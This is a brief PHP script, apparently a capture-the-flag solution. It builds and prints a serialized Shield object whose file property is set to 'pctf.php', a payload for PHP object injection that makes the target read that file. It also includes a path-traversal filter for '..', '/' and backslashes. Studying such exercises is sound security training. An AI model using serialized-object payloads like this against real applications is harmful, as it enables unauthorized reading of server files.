<?php
class Shield {
    public $file;
    function __construct($filename = '') {
        $this -> file = "pctf.php";
    }
    
    function readfile() {
        if (!empty($this->file) && stripos($this->file,'..')===FALSE  
        && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
            return @file_get_contents($this->file);
        }
    }
}
echo serialize(new Shield);
?>
